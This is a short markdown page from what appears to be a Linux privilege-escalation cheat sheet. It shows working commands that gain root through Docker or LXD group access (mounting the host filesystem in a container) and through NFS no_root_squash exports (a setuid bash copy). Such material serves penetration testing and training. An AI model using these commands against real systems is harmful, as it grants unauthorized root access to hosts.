# Groups, containers, and NFS

[← Linux quick reference](../03-linux-privesc.md)

Group membership is a lead. Check the matching socket, daemon mode, export, or mount before treating it as a root path.

```bash
id
groups
getent group docker
getent group lxd
ls -l /var/run/docker.sock /var/snap/lxd/common/lxd/unix.socket 2>/dev/null
docker version 2>/dev/null
lxc list 2>/dev/null
```

If the daemon is rootful and your user can reach its Docker socket, a container can mount the host filesystem:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

For an accessible LXD daemon and a suitable image:

```bash
lxc init alpine c -c security.privileged=true
lxc config device add c d disk source=/ path=/mnt
lxc start c
lxc exec c sh
```

Rootless Docker does not give the same host-root access. A group name without socket access proves little.

## NFS

```bash
cat /etc/exports 2>/dev/null
findmnt
showmount -e <NFS-SERVER>
```

`no_root_squash` disables the usual mapping of client UID 0 to an anonymous user. Confirm that the export is writable and reachable before trying the path below. The example requires root on the client and a compatible Bash binary.

```bash
mkdir /mnt/x
mount -o rw,vers=3 <NFS-SERVER>:/export /mnt/x
cp /bin/bash /mnt/x/rootbash
chmod +s /mnt/x/rootbash
```

```bash
/export/rootbash -p
```

## References

- [NFS exports](https://man7.org/linux/man-pages/man5/exports.5.html)
- [Docker daemon access](https://docs.docker.com/reference/cli/dockerd/)
